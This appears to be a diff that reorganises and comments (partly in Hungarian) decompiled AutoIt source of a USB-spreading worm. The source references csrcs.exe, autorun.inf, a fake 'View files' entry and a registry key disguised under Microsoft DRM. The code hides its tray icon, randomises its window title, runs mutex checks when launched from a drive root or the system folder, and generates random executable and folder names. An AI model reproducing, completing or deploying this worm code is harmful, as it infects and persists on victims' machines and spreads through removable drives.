@@ -1,25 +1,7 @@
-; hides tray icon
-TraySetState(2)
-Opt("TrayMenuMode", 1)
-
 Func Fn0079($ArgOpt00 = @error, $ArgOpt01 = @extended)
 	Local $Local0000 = DllCall("kernel32.dll", "dword", "GetLastError")
 	Return SetError($ArgOpt00, $ArgOpt01, $Local0000[0])
 EndFunc
-
-Global Const $Version[6] = ["V", 2, 4, 0, "20071231", "V2.4-0"]
-Global Const $Var024C = 1, $Var024D = 2
-Global Const $Var0278 = "long X;long Y"
-Global Const $Var0279 = "dword Length;ptr Descriptor;bool InheritHandle"
-
-Global $Var024E = 0x000493E0
-Global $Var024F = False
-Global $Var0250
-Global $Var0251 = True
-Global $Var0252, $Var0253
-Global $Var0254, $Var0255, $Var0256, $Var0257, $Var0258, $Var0259, $Var025A, $Var025B, $Var025C, $Var025D, $Var025E
-
-Global Enum $Var025F = 0, $Var0260, $Var0261, $Var0262, $Var0263, $Var0264, $Var0265, $Var0266, $Var0267, $Var0268
 
 Func Fn007A($StartPage = "about:blank", $ArgOpt01 = 0, $ArgOpt02 = 1, $ArgOpt03 = 1, $ArgOpt04 = 1)
 	If $Var0250 Then
@@ -1053,7 +1035,7 @@ Func Fn008E()
 EndFunc
 
 Func Fn008F($Arg00, $ArgOpt01 = 0)
-	Local Const $Var027A = 0x00B7
+	Local Const $Var027A = 0x00B7 ; 183
 	Local Const $Var027B = 1
 	Local $Local0016 = 0
 	If BitAND($ArgOpt01, 2) Then
@@ -1086,15 +1068,6 @@ Func Fn008F($Arg00, $ArgOpt01 = 0)
 	EndIf
 	Return $Local001A[0]
 EndFunc
-Global Const $Var027C = 2
-Global Const $Var027D = Ptr(-1)
-Global Const $Var027E = Ptr(-1)
-Global Const $Var027F = 0x0100
-Global Const $Var0280 = 0x2000
-Global Const $Var0281 = 0x8000
-Global Const $Var0282 = BitShift($Var027F, 8)
-Global Const $Var0283 = BitShift($Var0280, 8)
-Global Const $Var0284 = BitShift($Var0281, 8)
 
 Func Fn0090($Arg00, ByRef $ArgRef01, ByRef $ArgRef02, ByRef $ArgRef03)
 	If Number($Arg00) > 0 Then
@@ -5361,108 +5334,40 @@ Func Fn00ED()
 	ConsoleWrite($Var033E & @CRLF)
 EndFunc
 
-AutoItWinSetTitle(Fn00BA(Random(8, 0x0014, 1)))
-$ExeName1 = "cftuon.exe"
-$ProcessName1 = "cftuon"
-$ExeName2 = "cftu.exe"
-$ProcessName2 = "cftu"
-If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or
-   @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or
-   @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
-	Run(@ComSpec & " /c " & "explorer " & @ScriptDir, "", @SW_HIDE)
-	If @error Then
-	EndIf
-	Sleep(0x0BB8)
-	If Fn008F("981dsaf81wae98f19c8v98r1aeg1", 1) = 0 Then
-		Exit
-	EndIf
-EndIf
-If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName1 Then
-	If Fn008F("c9d5s169d5f19581g19s8g1g", 1) = 0 Then
-		Exit
-	EndIf
-EndIf
-If FileExists("95a1sd.xx") Then
-	$Var0290 = FileRead("95a1sd.xx")
-	If @AutoItExe = $Var0290 Then
-		FileWrite("vvfd", "")
-		Exit
-	EndIf
-EndIf
-$Var0291 = "alokium.exe"
-$Var0292 = "csrcs.exe"
-$Var0293 = "autorun.inf"
-$Var0294 = "autorun.i"
-$Var0295 = "autorun.in"
-$Var0296 = "csrcs"
-$Var0297 = "khy"
-$Var0298 = "csrcs.au3"
-$Var0299 = "NTrun.au3"
-$Var029A = "HKLM\Software\Microsoft\DRM\amty"
-$Var029B = "-1"
-$Var029C = 0
-$Var029D = 0
-$Var029E = 0
-$Var029F = ""
-$Var02A0 = ""
-$Var02A1 = ""
-$Var02A2 = "kiu"
-$Var02A3 = "View files"
-$Var02A4 = ""
-$Var02A5 = "-"
-$Var02A6 = "-"
-$Var02A7 = Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & ".exe"
-$Var02A8 = $Var02A7
-$Var02A9 = $Var02A7
-$Var02AA = 0
-$Var02AB = 0
-$Var02AC = 0
+; ---------------------------------------------------------------
+; globális konstansok
+; ---------------------------------------------------------------
+Global Const $Version[6] = ["V", 2, 4, 0, "20071231", "V2.4-0"]
+Global Const $Var024C = 1, $Var024D = 2
+Global Const $Var0278 = "long X;long Y"
+Global Const $Var0279 = "dword Length;ptr Descriptor;bool InheritHandle"
+
+Global Const $Var027C = 2
+Global Const $Var027D = Ptr(-1)
+Global Const $Var027E = Ptr(-1)
+Global Const $Var027F = 0x0100
+Global Const $Var0280 = 0x2000
+Global Const $Var0281 = 0x8000
+Global Const $Var0282 = BitShift($Var027F, 8)
+Global Const $Var0283 = BitShift($Var0280, 8)
+Global Const $Var0284 = BitShift($Var0281, 8)
+
+; ---------------------------------------------------------------
+; globális változók
+; ---------------------------------------------------------------
+Global $Var024E = 0x000493E0
+Global $Var024F = False
+Global $Var0250
+Global $Var0251 = True
+Global $Var0252, $Var0253
+Global $Var0254, $Var0255, $Var0256, $Var0257, $Var0258, $Var0259, $Var025A, $Var025B, $Var025C, $Var025D, $Var025E
+
+Global Enum $Var025F = 0, $Var0260, $Var0261, $Var0262, $Var0263, $Var0264, $Var0265, $Var0266, $Var0267, $Var0268
+
 Global $Var02AD
 Global $Var02AE
 Global $Var02AF
-$Var02B0 = 0
-$Var02B1 = 0x007F
-$Var02B2 = 0
-$Var02B3 = 0
-$Var02B4 = 1
-$Var02B5 = 0
-$Var02B6 = 0
-$Var02B7 = 0
-$Var02B8 = 0
-$Var02B9 = 0
-$Var02BA = "_PE04E6B7463C3BD27"
-$Var02BB = ""
-$Var02BC = ""
-$Var02BD = ""
-$Var02BE = ""
-$Var02BF = ""
-$Var02C0 = ""
-$Var02C1 = ""
-$Var02C2 = ""
-$Var02C3 = 1
-$Var02C4 = ""
-$Var02C5 = 0
-$Var02C6 = "none"
-$Var02C7 = "none"
-$Var02C8 = "none"
-$Var02C9 = "none"
-$Var02CA = "none"
-$Var02CB = "none"
-$Var02CC = "none"
-$Var02CD = "none"
-$Var02CE = 0
-$Var02CF = 0
-$Var02D0 = 0
-$Var02D1 = 0
-$Var02D2 = 0
-$Var02D3 = ""
-$Var02D4 = ""
-$Var02D5 = ""
-$Var02D6 = ""
-$Var02D7 = 0
-$Var02D8 = 1
-$Var02D9 = 1
-$Var02DA = 0
+
 Global $Var02DB
 Global $Var02DC
 Global $Var02DD
@@ -5512,12 +5417,123 @@ Global $Var0303, $Var0304, $Var0305, $Local002B, $Var0306, $Var0307, $Var0308, $
 Global $Var030F, $Var0310
 Global $Var0311 = "RegShellSM.exe"
 Global $Var0312, $Var0313, $Var0314, $Var0315
-$Var0316 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & Chr(Random(Asc("A"), Asc("Z"), 1)) & Random(0, 0x0001869F, 1) & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC
-$Var0317 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & Chr(Random(Asc("A"), Asc("Z"), 1)) & Random(0, 0x270F, 1)
-$Var0318 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & ".da"
+
 Global $Var0319 = @HomeDrive & "\" & $Var0316 & "\" & $Var0317 & "\"
 Global $Var031A = $Var0319 & $Var0318, $Var031B
 Global $Var031C
+
+; hides tray icon
+TraySetState(2)
+Opt("TrayMenuMode", 1)
+
+; ablak címének beállítása egy 8 és 20 közötti véletlen egész számra
+AutoItWinSetTitle(Fn00BA(Random(8, 0x0014, 1)))
+$ExeName1 = "cftuon.exe"
+$ProcessName1 = "cftuon"
+$ExeName2 = "cftu.exe"
+$ProcessName2 = "cftu"
+If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or
+   @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or
+   @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
+	; rejtett ablakban megnyitja a meghajtó gyökerét
+  Run(@ComSpec & " /c " & "explorer " & @ScriptDir, "", @SW_HIDE)
+	If @error Then
+	EndIf
+	; 3000 ms = 3 s
+  Sleep(0x0BB8)
+	If Fn008F("981dsaf81wae98f19c8v98r1aeg1", 1) = 0 Then
+		Exit
+	EndIf
+EndIf
+If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName1 Then
+	If Fn008F("c9d5s169d5f19581g19s8g1g", 1) = 0 Then
+		Exit
+	EndIf
+EndIf
+If FileExists("95a1sd.xx") Then
+	$Var0290 = FileRead("95a1sd.xx")
+	If @AutoItExe = $Var0290 Then
+		FileWrite("vvfd", "")
+		Exit
+	EndIf
+EndIf
+$Var0291 = "alokium.exe"
+$Var0292 = "csrcs.exe"
+$Var0293 = "autorun.inf"
+$Var0294 = "autorun.i"
+$Var0295 = "autorun.in"
+$Var0296 = "csrcs"
+$Var0297 = "khy"
+$Var0298 = "csrcs.au3"
+$Var0299 = "NTrun.au3"
+$Var029A = "HKLM\Software\Microsoft\DRM\amty"
+$Var029B = "-1"
+$Var029C = 0
+$Var029D = 0
+$Var029E = 0
+$Var029F = ""
+$Var02A0 = ""
+$Var02A1 = ""
+$Var02A2 = "kiu"
+$Var02A3 = "View files"
+$Var02A4 = ""
+$Var02A5 = "-"
+$Var02A6 = "-"
+$Var02A7 = Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & ".exe"
+$Var02A8 = $Var02A7
+$Var02A9 = $Var02A7
+$Var02AA = 0
+$Var02AB = 0
+$Var02AC = 0
+
+$Var02B0 = 0
+$Var02B1 = 0x007F
+$Var02B2 = 0
+$Var02B3 = 0
+$Var02B4 = 1
+$Var02B5 = 0
+$Var02B6 = 0
+$Var02B7 = 0
+$Var02B8 = 0
+$Var02B9 = 0
+$Var02BA = "_PE04E6B7463C3BD27"
+$Var02BB = ""
+$Var02BC = ""
+$Var02BD = ""
+$Var02BE = ""
+$Var02BF = ""
+$Var02C0 = ""
+$Var02C1 = ""
+$Var02C2 = ""
+$Var02C3 = 1
+$Var02C4 = ""
+$Var02C5 = 0
+$Var02C6 = "none"
+$Var02C7 = "none"
+$Var02C8 = "none"
+$Var02C9 = "none"
+$Var02CA = "none"
+$Var02CB = "none"
+$Var02CC = "none"
+$Var02CD = "none"
+$Var02CE = 0
+$Var02CF = 0
+$Var02D0 = 0
+$Var02D1 = 0
+$Var02D2 = 0
+$Var02D3 = ""
+$Var02D4 = ""
+$Var02D5 = ""
+$Var02D6 = ""
+$Var02D7 = 0
+$Var02D8 = 1
+$Var02D9 = 1
+$Var02DA = 0
+
+$Var0316 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & Chr(Random(Asc("A"), Asc("Z"), 1)) & Random(0, 0x0001869F, 1) & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC
+$Var0317 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & Chr(Random(Asc("A"), Asc("Z"), 1)) & Random(0, 0x270F, 1)
+$Var0318 = Random(0, 0x270F, 1) & @HOUR & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & Chr(Random(Asc("A"), Asc("Z"), 1)) & @MIN & Chr(Random(Asc("A"), Asc("Z"), 1)) & @SEC & ".da"
+
 $Var031D = ""
 $Var031E = ""
 $Var031F = ""
